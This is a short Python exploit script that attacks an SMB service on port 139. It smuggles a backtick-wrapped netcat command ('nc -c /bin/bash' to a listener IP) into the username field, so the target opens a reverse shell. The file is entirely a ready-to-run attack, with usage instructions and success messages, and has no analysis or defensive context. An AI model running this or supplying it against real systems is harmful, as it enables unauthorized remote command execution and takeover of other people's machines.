#!/usr/bin/python3

from smb.SMBConnection import SMBConnection
import sys
args = sys.argv

if len(args) < 3:
	print("script usage: python3 exploit.py <VICTIM_IP> <LISTENER_PORT>")
	print("Example: python3 exploit.py 192.168.29.1 9001")
	exit(0)

port = int(args[2])
server_ip = args[1]
username = f"`nc -c /bin/bash 192.168.1.6 {port}`"
password, client_machine_name, server_name = "", "", ""

conn = SMBConnection(username, password, client_machine_name, server_name, use_ntlm_v2=True)
try:
	print(f"[+] Sending payload on {server_ip}:139")
	print(f"[+] Connected, you should have got a shell")
	conn.connect(server_ip, 139)
except Exception as ex:
	print(f"[-] Error sending payload. Please check your configurations and try again.")
	print(ex)
finally:
	conn.close()
	print("[+] Closed connection succefully. Goodbye :)")
